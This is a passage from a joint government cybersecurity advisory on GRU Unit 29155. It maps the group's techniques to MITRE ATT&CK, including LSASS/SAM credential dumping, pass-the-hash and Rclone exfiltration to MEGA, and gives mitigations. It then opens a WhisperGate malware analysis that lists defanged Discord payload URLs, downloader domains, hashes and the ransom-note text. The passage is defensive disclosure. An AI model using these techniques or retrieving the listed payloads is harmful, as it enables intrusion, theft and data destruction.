<td>Unit 29155 cyber actors have exfiltrated LSASS memory dumps to retrieve credentials from victim machines.</td>
</tr>
<tr>
<td>OS Credential Dumping: Security Account Manager</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/002/\" title=\"OS Credential Dumping: Security Account Manager\">T1003.002</a></td>
<td>Unit 29155 cyber actors have exfiltrated usernames and hashed passwords from the SAM.</td>
</tr>
<tr>
<td>Brute Force: Password Spraying</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/003/\" title=\"Brute Force: Password Spraying\">T1110.003</a></td>
<td>Unit 29155 cyber actors targeted victims’ Microsoft OWA infrastructure with password spraying to obtain valid usernames and passwords.</td>
</tr>
<tr>
<td>Unsecured Credentials: Credentials in Files</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1552/001/\" title=\"Unsecured Credentials: Credentials in Files\">T1552.001</a></td>
<td>Following exploitation of vulnerable IP cameras, Unit 29155 cyber actors dump configuration settings and credentials in plaintext.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9: Discovery</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Network Service Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1046/\" title=\"Network Service Discovery\">T1046</a></td>
<td>Once Unit 29155 cyber actors gained access to victim internal networks, they further used Nmap (via the NSE) to write custom scripts for discovering and scanning other machines.</td>
</tr>
<tr>
<td>Log Enumeration</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1654/\" title=\"Log Enumeration\">T1654</a></td>
<td>Unit 29155 cyber actors have enumerated and exfiltrated SECURITY and SYSTEM logs.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10: Lateral Movement</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Use Alternate Authentication Material: Pass the Hash</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1550/002/\" title=\"Use Alternate Authentication Material: Pass the Hash\">T1550.002</a></td>
<td>Unit 29155 cyber actors used Pass-the-Hash to authenticate via SMB.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 11: Collection</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Email Collection</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1114/\" title=\"Email Collection\">T1114</a></td>
<td>Unit 29155 cyber actors have used their infrastructure to compromise multiple victims’ mail servers and exfiltrate mail artifacts, such as email messages.</td>
</tr>
<tr>
<td>Video Capture</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1125/\" title=\"Video Capture\">T1125</a></td>
<td>Unit 29155 cyber actors have exploited IoT devices, specifically IP cameras with default usernames and passwords, and exfiltrated images.</td>
</tr>
<tr>
<td>Data from Information Repositories: Confluence</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1213/001/\" title=\"Data from Information Repositories: Confluence\">T1213.001</a></td>
<td>Unit 29155 cyber actors leveraged Through the Wire against the victim’s internet-facing Confluence server.</td>
</tr>
<tr>
<td>Archive Collected Data</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1560/\" title=\"Archive Collected Data\">T1560</a></td>
<td>Unit 29155 cyber actors compress victim data (e.g., the entire filesystem, select file system artifacts or user data, and/or database dumps) to send back to their infrastructure.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 12: Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Proxy: Multi-hop Proxy</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/003/\" title=\"Proxy: Multi-hop Proxy\">T1090.003</a></td>
<td>
<p>Unit 29155 cyber actors executed commands via ProxyChains—a tool used to route internal traffic through a series of proxies.</p>
<p>ProxyChains was also used to provide further anonymity and modify system configuration to force network traffic through chains of SOCKS5 proxies and respective ports.</p>
</td>
</tr>
<tr>
<td>Application Layer Protocol: Web Protocols</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/001/\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a></td>
<td>Unit 29155 cyber actors use POST requests over HTTP to send payloads to victims.</td>
</tr>
<tr>
<td>Application Layer Protocol: DNS</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/004/\" title=\"Application Layer Protocol: DNS\">T1071.004</a></td>
<td>Unit 29155 cyber actors used DNS tunneling tools, such as dnscat/2 and Iodine, to tunnel IPv4 network traffic.</td>
</tr>
<tr>
<td>Non-Application Layer Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1095/\" title=\"Non-Application Layer Protocol\">T1095</a></td>
<td>Unit 29155 cyber actors commonly use a reverse TCP connection to initiate communication with their infrastructure.</td>
</tr>
<tr>
<td>Ingress Tool Transfer</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1105/\" title=\"Ingress Tool Transfer\">T1105</a></td>
<td>When an exploit is successfully executed on a victim system, Unit 29155 cyber actors are known to launch the Meterpreter payload to initiate communication with their actor-controlled systems.</td>
</tr>
<tr>
<td>Protocol Tunneling</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a></td>
<td>Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration to tunnel traffic over a single port (1194), VPNs, and GOST to anonymize their operational activity.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 13: Exfiltration</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exfiltration Over Web Service: Exfiltration to Cloud Storage</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1567/002/\" title=\"Exfiltration Over Web Service: Exfiltration to Cloud Storage\">T1567.002</a></td>
<td>Unit 29155 cyber actors exfiltrated data to the cloud storage and file hosting service, MEGA (mega[.]nz), using Rclone.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 14: Impact</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title&nbsp;</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data Destruction</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1485/\" title=\"Data Destruction\">T1485</a></td>
<td>Unit 29155 cyber actors’ objectives include the destruction of data.</td>
</tr>
</tbody>
</table>
<h2><strong>Mitigations</strong></h2>
<p>The authoring agencies recommend organizations implement the mitigations supplied below to improve organizational cybersecurity posture based on threat actor activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s&nbsp;<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<h3>Limit Adversarial Use of Common Vulnerabilities</h3>
<ul>
<li><strong>Prioritize patching to CISA’s&nbsp;</strong><a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\"><strong>Known Exploited Vulnerabilities Catalog</strong></a><strong>,&nbsp;</strong>especially for CVEs identified in this advisory, and then critical and high vulnerabilities that allow for remote code execution on internet-facing devices.</li>
<li><strong>Conduct regular automated vulnerability scans</strong> to perform vulnerability assessments on all network resources based on threat actor behaviors and known exploitable vulnerabilities (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E\" title=\"Mitigating Known Vulnerabilities (1.E)\">CISA CPG 1.E</a>).</li>
<li><strong>Limit exploitable services on internet-facing assets,</strong> such as email and remote management&nbsp;protocols (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#EmailSecurity2M\">CISA CPGs 2.M</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NoExploitableServicesontheInternet2W\" title=\"No Exploitable Services on the Internet (2.W)\">2.W</a>). Where necessary services must be exposed, such as services hosted in a demilitarized zone (DMZ), implement the appropriate compensatory controls to prevent common forms of abuse and exploitation. Disable all unnecessary operating system applications and network protocols to combat adversary enumeration. For additional guidance, see <a href=\"https://www.cisa.gov/sites/default/files/publications/CISAInsights-Cyber-RemediateVulnerabilitiesforInternetAccessibleSystems_S508C.pdf\" title=\"Remediate Vulnerabilities for Internet-Accessible Systems\">CISA Insights: Remediate Vulnerabilities for Internet-Accessible Systems</a>.</li>
<li><strong>U.S. organizations can utilize a range of CISA services at no cost, including vulnerability scanning and testing, to help organizations reduce exposure to threats.</strong> CISA Cyber Hygiene services can provide additional review of internet-accessible assets and provide regular reports on steps to take to mitigate vulnerabilities. Email <a href=\"mailto:vulnerability@cisa.dhs.gov\" title=\"Vulnerability\">vulnerability@cisa.dhs.gov</a> with the subject line, “Requesting Cyber Hygiene Services,” to get started.</li>
<li><strong>Software manufacturers, vendors, and consumers</strong> are encouraged to review CISA and NIST’s <a href=\"https://www.cisa.gov/resources-tools/resources/defending-against-software-supply-chain-attacks-0\" title=\"Defending Against Software Supply Chain Attacks\">Defending Against Supply Chain Attacks</a>. This publication provides an overview of software supply chain risks and recommendations for how software customers and vendors can use the NIST Cyber Supply Chain Risk Management (C-SCRM) Framework and the Secure Software Development Framework (SSDF) to identify, assess, and mitigate software supply chain risks. CISA recommends comprehensive mitigations for supply chain incident reporting, vulnerability disclosing (e.g., security.txt), and choosing a trusted supplier or vendor that observes proper cyber security hygiene (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SupplyChainIncidentReporting1G\" title=\"Supply Chain Incident Reporting (1.G)\">CISA CPG 1.G</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SupplyChainVulnerabilityDisclosure1H\" title=\"Supply Chain Vulnerability Disclosure (1.H)\">1.H</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#VendorSupplierCybersecurityRequirements1I\" title=\"Vendor/Supplier Cybersecurity Requirements (1.I)\">1.I</a>) to defend against upstream attacks.</li>
</ul>
<h3>Deploy Protective Controls and Architecture</h3>
<ul>
<li><strong>Implement network segmentation.</strong> Network segmentation can help prevent lateral movement by controlling traffic flows between—and access to—various subnetworks (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NetworkSegmentation2F\" title=\"Network Segmentation (2.F)\">CISA CPG 2.F</a>). Best practice mitigations include updating Identity and Access Management (IAM) and employing phishing-resistant MFA for all devices and accounts identified as organizational assets. For additional guidance, see CISA and NSA’s&nbsp;<a href=\"https://www.cisa.gov/news-events/alerts/2023/03/21/cisa-and-nsa-release-enduring-security-framework-guidance-identity-and-access-management\" title=\"CISA and NSA Release Enduring Security Framework Guidance on Identity and Access Management\">IAM Recommended Best Practices Guide for Administrators</a> (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#PhishingResistantMultifactorAuthenticationMFA2H\" title=\"Phishing-Resistant Multifactor Authentication (MFA) (2.H)\">CISA CPG 2.H</a>).</li>
<li><strong>Verify and ensure that sensitive data, including credentials, are not stored in plaintext&nbsp;and can only be accessed by authenticated and authorized users.</strong> Credentials must be stored in a secure manner, such as with a credential/password manager to protect from malicious enumeration (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SecureSensitiveData2L\" title=\"Secure Sensitive Data (2.L)\">CISA CPG 2.L</a>).</li>
<li><strong>Disable and/or restrict use of command line and PowerShell activity.</strong> Update to the latest version and uninstall all earlier PowerShell versions (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DisableMacrosbyDefault2N\" title=\"Disable Macros by Default (2.N)\">CISA CPG 2.N</a>).</li>
<li><strong>Implement a continuous system monitoring program, such as security information and event management (SIEM) or endpoint detection and response (EDR) solutions,</strong> to comprehensively log and review all authorized external access connections. This logging will better ensure the prompt detection of misuse or abnormal activity (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#LogCollection2T\" title=\"Log Collection (2.T)\">CISA CPG 2.T</a>).</li>
<li><strong>Monitor for unauthorized access attempts and programming anomalies</strong> through comprehensive logging that is secured from modification, such as limiting permissions and adding redundant remote logging (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SecureLogStorage2U\" title=\"Secure Log Storage (2.U)\">CISA CPG 2.U</a>). Security appliances should be set to detect and/or block Impacket framework indicators, PSExec or WMI commands, and suspicious PowerShell commands for timely identification and remediation.</li>
<li><strong>Identify any use of outdated or weak encryption,</strong> update these to sufficiently strong algorithms, and consider the implications of post-quantum cryptography (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#StrongandAgileEncryption2K\" title=\"Strong and Agile Encryption (2.K)\">CISA CPG 2.K</a>). Use properly configured and up-to-date Secure Socket Layer (SSL)/Transport Layer Security&nbsp;(TLS) to protect data in transit.</li>
</ul>
<h2><strong>Security Controls</strong></h2>
<p>In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see <strong>Table 3 to&nbsp;Table 14</strong>).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h2><strong>Resources</strong></h2>
<ul>
<li><a href=\"https://attack.mitre.org/software/S0689/\" title=\"WhisperGate\">MITRE: WhisperGate</a></li>
<li><a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-057a\" title=\"Destructive Malware Targeting Organizations in Ukraine\">CISA AA22-057A: Destructive Malware Targeting Organizations in Ukraine</a></li>
<li><a href=\"https://www.justice.gov/opa/pr/russian-national-charged-conspiring-russia-military-intelligence-destroy-ukrainian\" title=\"Russian National Charged for Conspiring with Russian Military Intelligence to Destroy Ukrainian Government Computer Systems and Data\">DOJ Press Release: Russian National Charged for Conspiring with Russian Military Intelligence to Destroy Ukrainian Government Computer Systems and Data</a></li>
<li><a href=\"https://www.fbi.gov/investigate/cyber\" title=\"Cyber Crime\">FBI: Cyber Crime</a></li>
<li><a href=\"https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/russia\" title=\"Russia Cyber Threat Overview and Advisories\">CISA: Russia Cyber Threat Overview and Advisories</a></li>
<li><a href=\"https://attack.mitre.org/groups/G1003/\" title=\"Ember Bear\">MITRE: Group G1003 - Ember Bear</a></li>
<li><a href=\"https://attack.mitre.org/versions/v15/software/S0357/\" title=\"Impacket\">MITRE: Impacket</a></li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-1472\" title=\"CVE-2020-1472\">NIST NVD: CVE-2020-1472</a></li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-26084\" title=\"CVE-2021-26084\">NIST NVD: CVE-2021-26084</a></li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-3156\" title=\"CVE-2021-3156\">NIST NVD: CVE-2021-3156</a></li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-4034\" title=\"CVE-2021-4034\">NIST NVD: CVE-2021-4034</a></li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-27666\" title=\"CVE-2022-27666\">NIST NVD: CVE-2022-27666</a></li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-33044\" title=\"CVE-2021-33044\">NIST NVD: CVE-2021-33044</a></li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-33045\" title=\"CVE-2021-33045\">NIST NVD: CVE-2021-33045</a></li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-26134\" title=\"CVE-2022-26134\">NIST NVD: CVE-2022-26134</a></li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-26138\" title=\"CVE-2022-26138\">NIST NVD: CVE-2022-26138</a></li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-3236\" title=\"CVE-2022-3236\">NIST NVD: CVE-2022-3236</a></li>
<li><a href=\"https://attack.mitre.org/software/S0521/\" title=\"BloodHound\">MITRE: BloodHound</a></li>
<li><a href=\"https://attack.mitre.org/versions/v15/software/S1040/\" title=\"Rclone\">MITRE: Rclone</a></li>
<li><a href=\"https://attack.mitre.org/versions/v15/software/S0598/\" title=\"P.A.S. Webshell\">MITRE: P.A.S. Webshell</a></li>
<li><a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">CISA: Known Exploited Vulnerabilities Catalog</a></li>
<li><a href=\"https://www.cisa.gov/sites/default/files/publications/CISAInsights-Cyber-RemediateVulnerabilitiesforInternetAccessibleSystems_S508C.pdf\" title=\"Remediate Vulnerabilities for Internet-Accessible Systems\">CISA Insights: Remediate Vulnerabilities for Internet-Accessible Systems</a></li>
<li><a href=\"https://www.cisa.gov/resources-tools/resources/defending-against-software-supply-chain-attacks-0\" title=\"Defending Against Supply Chain Attacks\">CISA, NIST: Defending Against Supply Chain Attacks</a></li>
<li><a href=\"https://www.cisa.gov/news-events/alerts/2023/03/21/cisa-and-nsa-release-enduring-security-framework-guidance-identity-and-access-management\" title=\"IAM Recommended Best Practices Guide for Administrators\">CISA, NSA: IAM Recommended Best Practices Guide for Administrators</a></li>
</ul>
<h2><strong>References</strong></h2>
<ol>
<li><a href=\"https://www.microsoft.com/en-us/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/\" title=\"Destructive Malware Targeting Ukrainian Organizations\">Microsoft Threat Intelligence Center: Destructive Malware Targeting Ukrainian Organizations</a></li>
<li><a href=\"https://www.microsoft.com/en-us/security/blog/2023/06/14/cadet-blizzard-emerges-as-a-novel-and-distinct-russian-threat-actor/?msockid=2383e2d882c06a751a17f64383d26b64\" title=\"Cadet Blizzard Emerges as a Novel and Distinct Russian Threat Actor\">Microsoft Threat Intelligence Center: Cadet Blizzard Emerges as a Novel and Distinct Russian Threat Actor</a></li>
<li><a href=\"https://www.crowdstrike.com/blog/who-is-ember-bear/\" title=\"Featured Recent Videos Categories Start Free Trial Featured Recent Videos Categories Start Free Trial\">CrowdStrike: EMBER BEAR Threat Actor Profile</a></li>
<li><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/russia-invasion-ukraine-retaliation/\" title=\"Responses to Russia's Invasion of Ukraine Likely to Spur Retaliationred Recent Videos Categories Start Free Trial\">Mandiant Threat Intelligence: Responses to Russia's Invasion of Ukraine Likely to Spur Retaliation</a>&nbsp;</li>
<li><a href=\"https://www.sentinelone.com/blog/threat-actor-uac-0056-targeting-ukraine-with-fake-translation-software/\" title=\"Threat Actor UAC-0056 Targeting Ukraine with Fake Translation Software\">SentinelOne: Threat Actor UAC-0056 Targeting Ukraine with Fake Translation Software</a></li>
<li><a href=\"https://www.acunetix.com/support/docs/introduction/\" title=\"Introduction to Acunetix\">Introduction to Acunetix</a></li>
<li><a href=\"https://github.com/owasp-amass/amass\" title=\"owasp-amass / amass\">GitHub: OWASP Amass</a></li>
<li><a href=\"https://kalilinuxtutorials.com/droopescan/\" title=\"Droopescan : A Plugin-Based Scanner That Aids Security Researchers\">Kali Linux Tutorials: Droopescan</a></li>
<li><a href=\"https://github.com/OWASP/joomscan\" title=\"OWASP / joomscan\">GitHub: OWASP JoomScan</a></li>
<li><a href=\"https://www.kali.org/tools/masscan/\" title=\"Masscan\">Kali.org: MASSCAN</a></li>
<li><a href=\"https://www.digitalocean.com/community/tutorials/how-to-use-netcat-to-establish-and-test-tcp-and-udp-connections\" title=\"How To Use Netcat to Establish and Test TCP and UDP Connections\">DigitalOcean: How To Use Netcat to Establish and Test TCP and UDP Connections</a></li>
<li><a href=\"https://help.shodan.io/the-basics/what-is-shodan\" title=\"What is Shodan?\">Shodan: What is Shodan?</a></li>
<li><a href=\"https://docs.virustotal.com/docs/how-it-works\" title=\"How it Works\">VirusTotal: How it Works</a></li>
<li><a href=\"https://github.com/jbaines-r7/through_the_wire\" title=\"Through the Wire\">GitHub: Through the Wire</a></li>
<li><a href=\"https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html\" title=\"Confluence Security Advisory: Confluence Server and Data Center - CVE-2022-26134\">Confluence Security Advisory: Confluence Server and Data Center - CVE-2022-26134</a></li>
<li><a href=\"https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010\" title=\"Microsoft Security Bulletin MS17-010 - Critical\">Microsoft: Security Bulletin MS17-010</a></li>
<li><a href=\"https://www.avast.com/c-eternalblue\" title=\"What Is EternalBlue and Why Is the MS17-010 Exploit Still Relevant?\">Avast: What is EternalBlue and Why is the MS17-010 Exploit Still Relevant?</a></li>
<li><a href=\"https://unit42.paloaltonetworks.com/ukraine-cyber-conflict-cve-2021-32648-whispergate/\" title=\"Threat Brief: Ongoing Russia and Ukraine Cyber Activity\">Palo Alto Networks Unit 42: Threat Brief - Ongoing Russia and Ukraine Cyber Activity</a></li>
<li><a href=\"https://cert.gov.ua/article/18419\" title=\"CERT-UA#3799 Report\">CERT-UA#3799 Report</a></li>
<li><a href=\"https://www.bellingcat.com/news/2022/02/23/attack-on-ukrainian-government-websites-linked-to-russian-gru-hackers/\" title=\"Attack on Ukrainian Government Websites Linked to GRU Hackers\">Bellingcat: Attack on Ukrainian Government Websites Linked to GRU Hackers</a></li>
<li><a href=\"https://www.trendmicro.com/en_us/research/22/c/cyberattacks-are-prominent-in-the-russia-ukraine-conflict.html\" title=\"Cyberattacks are Prominent in the Russia-Ukraine Conflict\">Trend Micro: Cyberattacks are Prominent in the Russia-Ukraine Conflict</a></li>
</ol>
<h2><strong>Contact Information</strong></h2>
<p>To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory, contact <a href=\"https://www.fbi.gov/contact-us/field-offices\">your local FBI field office</a> or CISA’s 24/7 Operations Center at <a href=\"mailto:saycisa@cisa.dhs.gov\" title=\"Email CISA\">saycisa@cisa.dhs.gov</a> or (888) 282-0870. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. For NSA client requirements or general cybersecurity inquiries, contact <a href=\"mailto:Cybersecurity_Requests@nsa.gov\">Cybersecurity_Requests@nsa.gov</a>.</p>
<h2><strong>Disclaimer</strong></h2>
<p>The information in this report is being provided “as is” for informational purposes only. CISA and the authoring agencies do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA and the authoring agencies.</p>
<h2><strong>Version History</strong></h2>
<p><strong>September 5, 2024:</strong> Initial version.</p>
<h2><strong>Appendix A: WhisperGate Malware Analysis</strong></h2>
<h3>Overview</h3>
<p>This technical analysis details the WhisperGate malware deployed against Ukraine; samples were collected from one victim and analyzed. The analysis provides insight into Unit 29155 cyber actor infrastructure used for network scanning, password compromising, and data exfiltration against Ukraine, NATO members in Europe and North America, and countries in Latin America and Central Asia.</p>
<p>Unit 29155 cyber actors’ use of WhisperGate involved the deployment of the malware files, <code>stage1.exe</code> and <code>stage2.exe</code>. WhisperGate has two stages that corrupts a system’s master boot record, displays a fake ransomware note, and encrypts files based on certain file extensions (see <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-057a\">AA22-057A</a>). The actors used multiple Discord accounts to store malware files, including what appears to be development versions or iterations of the binaries. Discord is commonly leveraged by threat actors as an endpoint for malware distribution and control; in this case, it was used to obtain the next step of the infection chain by directly sharing files through its platform. In the case of <code>stage2.exe</code>, the binary communicated with Discord to obtain <code>Tbopbh.jpg</code>—the malicious payload that is in-memory loaded and performs the destructive capabilities.[<a href=\"https://unit42.paloaltonetworks.com/ukraine-cyber-conflict-cve-2021-32648-whispergate/\">18</a>]</p>
<h3>Categorization</h3>
<p>The Discord accounts associated with the WhisperGate campaign are categorized into three main clusters, labeled below as Clusters 1, 2, and 3. All clusters used Discord as a staging environment for malware deployment. These groupings are based on analysis of threat actor IP addresses and the nature of the malware that existed within the accounts. The following sections include notable details found within each cluster.</p>
<h4><strong>Cluster 1</strong></h4>
<p>Cluster 1 contained the following files:</p>
<ul>
<li><code>hxxps://cdn.discordapp[.]com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg</code> (a resource, e.g., payload, for stage2.exe)[<a href=\"https://unit42.paloaltonetworks.com/ukraine-cyber-conflict-cve-2021-32648-whispergate/\">18</a>]</li>
<li><code>saint.exe</code> (a downloader, <code>SaintBot</code>, as detailed by CERT-UA)[<a href=\"https://cert.gov.ua/article/18419\">19</a>]</li>
<li><code>puttyjejfrwu.exe</code>[<a href=\"https://cert.gov.ua/article/18419\">19</a>]</li>
</ul>
<h4><strong>Cluster 2</strong></h4>
<p>Cluster 2 contained:</p>
<ul>
<li><code>hxxps://cdn.discordapp[.]com/attachments/888408190625128461/895633952247799858/n.lashevychdirekcy.atom.gov.ua.zip</code> (means for sending malware in over 35 different zip files via Discord links)[<a href=\"https://www.bellingcat.com/news/2022/02/23/attack-on-ukrainian-government-websites-linked-to-russian-gru-hackers/\">20</a>]</li>
<li>Several Microsoft Word documents with macros that download <code>test01.exe</code> from <code>3237.site</code>. Once executed, <code>test01.exe</code> downloads <code>load2022.exe</code> from <code>smm2021.net</code>.</li>
</ul>
<h4><strong>Cluster 3</strong></h4>
<p>Cluster 3 contained:</p>
<ul>
<li><code>hxxps://cdn.discordapp[.]com/attachments/945968593030496269/945970446149509130/Client.exe</code> (<strong>Note:&nbsp;</strong>Unit 29155 cyber actors’ use of <code>Client.exe</code> was confirmed as linked to the activity, but the file was not obtained for analysis and functionality cannot be confirmed.)&nbsp;</li>
<li><code>asd.exe</code> (likely a development version of <code>stage1.exe</code>)</li>
</ul>
<h3>Behavioral Analysis</h3>
<p>Two Windows Portable Executable (PE) files (<code>stage1.exe</code> and <code>stage2.exe</code>) were obtained from the Ukrainian victim for analysis. One PE file (<code>asd.exe</code>) was obtained from a U.S. victim.</p>
<h4><strong>stage1.exe</strong></h4>
<p><code>stage1.exe</code> was obtained from the C:\\ path of the Ukrainian victim’s Windows machine. <code>stage1.exe</code> executes when the infected device is powered down, overwriting the master boot record (MBR) and preventing the system from booting normally. <strong>Table 15</strong> lists the hashes and properties attributed to <code>stage1.exe</code>.</p>
<div>
<table>
<caption><em>Table 15: stage1.exe Properties</em></caption>
<tbody>
<tr>
<th>MD5</th>
<td>5d5c99a08a7d927346ca2dafa7973fc1</td>
</tr>
<tr>
<th>SHA-256</th>
<td>a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92</td>
</tr>
<tr>
<th>Compiler</th>
<td>MinGW(GCC: (GNU) 6.3.0)[-]</td>
</tr>
<tr>
<th>Linker</th>
<td>GNU linker Id (GNU Binutils)(2.28)[GUI32]</td>
</tr>
<tr>
<th>TimeDateStamp</th>
<td>2022-01-10 05:37:18</td>
</tr>
<tr>
<th>Execution Message</th>
<td>Your hard drive has been corrupted. In case you want to recover all hard drives of your organization, You should pay us $10k via bitcoin wallet 1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv and send message via tox ID 8BEDC411012A33BA34F49130D0F186993C6A32DAD8976F6A5D82C1ED23054C057ECED5496F65 with your organization name. We will contact you to give further instructions.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table>
<caption><em>Table 16: asd.exe Properties</em></caption>
<tbody>
<tr>
<th>MD5</th>
<td>eac0ae655d344c25ff467a929790885c</td>
</tr>
<tr>
<th>SHA-256</th>
<td>b9e64b58d7746cb1d3bed20405ef34d097af08c809d8dad10b9296b0bebb2b0b</td>
</tr>
<tr>
<th>Compiler</th>
